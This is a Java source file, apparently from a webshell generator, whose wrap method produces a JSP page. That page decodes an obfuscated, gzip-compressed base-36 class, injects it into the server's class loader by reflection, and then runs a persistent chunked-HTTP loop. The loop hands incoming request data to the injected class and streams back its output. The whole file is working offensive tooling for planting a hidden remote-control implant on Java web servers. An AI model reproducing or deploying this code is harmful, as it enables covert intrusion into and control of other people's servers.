package org.leo.jmg.jsp.httpchunk;


import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.util.zip.GZIPOutputStream;

public class JspServer {
    public String wrap(String coreClassName,byte[] coreClass,int respCode) throws IOException {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        GZIPOutputStream gzipOutputStream = new GZIPOutputStream(byteArrayOutputStream);
        gzipOutputStream.write(coreClass);
        gzipOutputStream.finish();
        gzipOutputStream.close();
        BigInteger bigInteger = new BigInteger(1, byteArrayOutputStream.toByteArray());


        StringBuilder sb = new StringBuilder();
        sb.append("<%@ page import=\"java.io.*\" %>\n" +
                  "<%@ page import=\"java.util.zip.GZIPInputStream\" %>\n" +
                  "<%@ page import=\"java.math.BigInteger\" %>\n" +
                  "<%@ page import=\"java.lang.reflect.Method\" %>\n" +
                  "<%\n" +
                  "    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n" +
                  "    byte[] buffer = new byte[1024];\n" +
                  "    int bytesRead;\n" +
                  "    try {\n" +
                  "        Class.forName(\""+coreClassName+"\");\n" +
                  "    } catch (ClassNotFoundException e) {\n" +
                  "        String cls=\""+bigInteger.toString(36)+"\";\n" +
                  "        byte[] clsBytes=new BigInteger(cls,36).toByteArray();\n" +
                  "        if(clsBytes[0]==0){byte[] tmp=new byte[clsBytes.length-1];System.arraycopy(clsBytes,1,tmp,0,tmp.length);clsBytes=tmp;}\n" +
                  "        GZIPInputStream gzipInputStream=new GZIPInputStream(new ByteArrayInputStream(clsBytes));\n" +
                  "        while ((bytesRead = gzipInputStream.read(buffer)) != -1) {\n" +
                  "            byteArrayOutputStream.write(buffer, 0, bytesRead);\n" +
                  "        }\n" +
                  "        Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\",new Class[]{String.class, byte[].class, int.class, int.class});\n" +
                  "        defineClassMethod.setAccessible(true);\n" +
                  "        defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),new Object[]{null, byteArrayOutputStream.toByteArray(), (Object) 0, (Object) byteArrayOutputStream.size()});\n" +
                  "    }\n" +
                  "    DataInputStream dataInputStream=new DataInputStream(request.getInputStream());\n" +
                  "    response.setHeader(\"X-Accel-Buffering\", \"no\");\n" +
                  "    response.setBufferSize(4096*4);\n" +
                  "    DataOutputStream dataOutputStream=new DataOutputStream(response.getOutputStream());\n" +
                  "    dataOutputStream.flush();\n" +
                  "    while (true){\n" +
                  "        int dataLen=dataInputStream.readInt();\n" +
                  "        byte[] data =new byte[dataLen];\n" +
                  "        dataInputStream.readFully(data);\n" +
                  "        byte[] respData;\n" +
                  "        if ((new String(data,\"utf-8\")).equals(\"heartbeat\")){\n" +
                  "            respData=\"heartbeat\".getBytes(\"utf-8\");\n" +
                  "        }else {\n" +
                  "            byteArrayOutputStream=new ByteArrayOutputStream();\n" +
                  "            byteArrayOutputStream.write(data);\n" +
                  "            Class.forName(\""+coreClassName+"\").newInstance().equals(byteArrayOutputStream);\n" +
                  "            respData=byteArrayOutputStream.toByteArray();\n" +
                  "        }\n" +
                  "        dataOutputStream.writeInt(respData.length);\n" +
                  "        dataOutputStream.write(respData);\n" +
                  "        dataOutputStream.flush();\n" +
                  "    }\n" +
                  "%>");
        return sb.toString();
    }
}
